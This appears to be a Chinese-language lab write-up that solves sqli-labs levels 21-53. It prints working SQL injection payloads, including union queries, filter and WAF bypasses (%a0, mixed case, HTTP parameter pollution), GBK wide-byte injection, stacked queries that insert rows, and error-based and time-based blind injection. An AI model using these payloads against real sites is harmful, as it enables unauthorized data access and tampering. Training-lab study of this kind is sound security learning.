## sqlilab做题总结（二）

继续昨天的内容，今天的任务是Less21-Less53。

##### Less21-22

这两个题的提示是cookie注入，Less21的闭合方式是单引号加括号，Less22的闭合方式是双引号。全部采用联合查询注入即可。

##### Less23

Less23中注释无法使用，发现闭合方式是单引号，故可借助最后多出来的单引号在联合查询的最后一位进行闭合，payload如下：

```sql
?id=0' union select 1,2,'3  # 最后一个'3将结合原先sql语句中存在的单引号，实现闭合。
```

随后就是联合查询注入，不再赘述。

##### Less24

Less24是二次注入。这个题首先观察页面，发现有登录，注册页面。随意注册一个账号登录上去后发现有个登录后显示信息的页面，可以修改密码，可以退出登录。题目提示二次注入，考虑修改密码的逻辑，猜测修改密码的地方没有进行转义，尝试注册```admin' --```的用户，登录上去后修改密码，随后退出，使用admin用户名登录，密码为刚刚修改的密码，发现成功登录。

进行白盒测试，审计代码，发现登录后修改密码的逻辑中存在漏洞，获取的用户名是从session中获取的，且没有进行转义，这时如果注册了一个包含注入代码的username，这里获取到的username就会改变update语句的结构，造成二次注入。

##### Less25/Less25a

这两个题过滤了and和or，and可以通过&&绕过，or可以通过||绕过，其他的就正常操作即可。注意闭合方式。

##### Less26/26a

这两个题过滤空格和注释，注释可以通过巧妙闭合单引号来避免掉注释的使用，空格的绕过方法有以下几种，可以逐一尝试：

```
1./**/绕过，/**/相当于空格
2.%a0绕过，url编码时这个被正则表达式识别为中文字符，不会过滤，而mysql不能识别，不能识别的字符会变成一个空格。
3.巧用小括号(特定情况下)
```

这里通过%0a绕过即可。

##### Less27/27a/28/28a

这四个题过滤了union select.通过试验发现，可以通过任意位大小写，双写等方法绕过。其中Less27a整体过滤了union select这个词组，这里通过%a0(union%a0select)即可绕过。(对于注释和空格的过滤可继续使用上面提到的方法绕过)。

给一个这四个题全部绕过的payload(只需考虑不同的引号/括号闭合方式，以28a为例)：

```sql
?id=0')%a0unIOn%a0SElEct%a01,2,('3
```

##### Less29/30/31

这两个题提示WAF，但是自己做测试的时候并没有发现在哪里过滤什么东西了...直接联合查询好像没啥问题。后来看了别人的wp，发现了这里的特殊点：根据不同的Web服务器和应用服务器特性，在遇到相同参数时，读取的参数是不一样的(但是对这个题貌似没用诶....)

具体，例如```index.php?id=1&id=2```,如果是apache(php)服务器，将解析最后一个id参数，如果是tomcat(jsp)服务器，则解析第一个参数，Apache(Perl(CGI))解析第一个参数，Apache(python)全部获取，返回list。

这里有个问题，如果传入index.jsp?id=1&id=2,那么最终返回客户端的是哪个参数呢？答案是最后一个参数，因为最终为客户端提供服务的是web服务器，也就是Apache,Apache解析最后一个参数，故返回的是id=2。

这里的一个启发是，在实际的Web应用中，经常会遇到两层服务器的情况，而我们往往是在tomcat应用服务器层进行过滤，功能类似WAF。

而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id=1&id=0 or 1=1--+，tomcat 只检查第一个参数id=1，而对第二个参数id=0 or 1=1--+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。

(这个操作的专业叫法是：HTTP参数污染攻击)

##### Less32/33

这两个题是get型宽字节注入。宽字节注入的原理是url编码将一个精心构造好的url编码字符传入，由于后台mysql设置GBK编码，php为GBK编码，函数执行的是添加ascii码，假如我们传入```%df'```,最终传入mysql的是%df%5c%27,其中%df%5c会被识别成一个宽字节，这时原本添加的\转义就被吃掉了，从而实现了注入的目的。

本题payload：

```sql
?id=0%df' union select 1,database(),3 %23
```

##### Less34

post型宽字节注入，将utf8转为utf16即可绕过。payload：

```
�' union select 1,database(),3#
```

##### Less35

数字型，escape函数没用，直接注入即可。

##### Less36

同Less33,%df宽字节注入。

##### Less37

同Less34,注意一下这次只有两列即可。

##### Less38-41

堆叠注入。指的是在某些情况下，后端的sql语句执行函数可以执行多条命令(例如mysqli_multi_query())，这个时候我们可以通过;来结束前一条sql语句，随后再在分号后面写入sql，从而实现“堆一堆”sql语句进行注入。而;后的语句理论上没有过滤的话则可以为所欲为。
不过堆叠注入利用的条件有限，因为一般情况下后台的sql执行函数为安全起见只允许执行单一sql，分号后的语句将会被忽略。

payload(注意引号闭合方式，此处以Less38为例):

```sql
1';insert into users(id,username,password) values (100,"a","b"); %23
```

##### Less42/43/44/45

这几个题均需在passwd处进行堆叠注入。42,43有回显，44,45无回显。payload:

```sql
1';insert into users(id,username,password) values (100,"a","b"); %23
```

##### Less46/47/48/49

order by注入，由于不在where语句位置，故无法使用联合查询注入，这里主要采用报错注入和盲注的方式。payload: 

```sql
Less46:sort=1 and updatexml(1,concat('~',database()),1) # 报错注入
Less47:sort=1' and if(ascii(substr(database(),1,1))=115,0,sleep (5)) %23
Less48:sort=1 and if(ascii(substr(database(),1,1))=115,sleep(5),0) %23
Less49:sort=1 and if(ascii(substr(database(),1,1))=115,sleep(5),0) %23
```

##### Less50/51/52/53

order by+堆叠注入。payload如下：

```sql
1';insert into users(id,username,password) values (500,"sss","dddd");%23
```

